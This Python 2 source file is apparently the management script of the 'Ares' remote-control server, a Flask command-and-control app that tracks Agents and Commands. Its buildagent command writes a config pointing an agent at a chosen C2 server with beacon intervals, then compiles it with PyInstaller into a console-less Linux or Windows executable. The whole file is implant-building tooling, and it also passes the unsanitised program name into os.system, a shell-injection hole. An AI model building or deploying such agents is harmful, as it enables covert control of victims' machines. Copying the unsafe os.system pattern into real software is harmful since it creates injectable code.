#!/usr/bin/env python

import random
import string
import hashlib
from functools import wraps
import datetime
import os
import shutil
import tempfile

from flask import Flask
from flask_script import Manager

from models import db
from models import Agent
from models import Command
from webui import webui
from api import api
from config import config


app = Flask(__name__)
app.config.from_object(config['dev'])
app.register_blueprint(webui)
app.register_blueprint(api, url_prefix="/api")
db.init_app(app)
manager = Manager(app)


@manager.command
def initdb():
    db.drop_all()
    db.create_all()
    db.session.commit()

@manager.command
def buildagent(prog_name, platform, server_url, hello_interval, idle_time, max_failed_connections):
    if platform not in ['Linux', 'Windows']:
        print "Supported platforms are 'Linux' and 'Windows'"
        return
    if platform == 'Linux' and os.path.exists('agents/' + prog_name) or \
        platform == 'Windows' and os.path.exists('agents/' + prog_name + '.exe'):
        print "File exists."
        exit(0)
    working_dir = os.path.join(tempfile.gettempdir(), 'ares')
    if os.path.exists(working_dir):
        shutil.rmtree(working_dir)
    shutil.copytree('../agent', working_dir)
    with open(os.path.join(working_dir, "config.py"), 'w') as agent_config:
        agent_config.write("""SERVER = "%s"\nHELLO_INTERVAL = %s\nIDLE_TIME = %s\nMAX_FAILED_CONNECTIONS = %s\n""" %
          (server_url.rstrip('/'), hello_interval, idle_time, max_failed_connections))
    cwd = os.getcwd()
    os.chdir(working_dir)
    shutil.move('agent.py', prog_name + '.py')
    if platform == 'Linux':
        if os.name != 'posix':
            print "Can only build Linux agents on Linux."
            exit(0)
        os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        agent_file = os.path.join(working_dir, 'dist', prog_name)
    elif platform == 'Windows':
        if os.name == 'posix': 
            os.system('wine pyinstaller --noconsole --onefile ' + prog_name + '.py')
        else:
            os.system('pyinstaller --noconsole --onefile ' + prog_name + '.py')
        agent_file = os.path.join(working_dir, 'dist', prog_name + ".exe")
    else:
        print "No such platform: %s" % platform
    os.chdir(cwd)
    if not os.path.exists('agents'):
        os.mkdir('agents')
    shutil.move(agent_file, 'agents')
    shutil.rmtree(working_dir)
    print "Agent built successfully: %s" % os.path.basename(agent_file)
    
if __name__ == '__main__':
    manager.run()
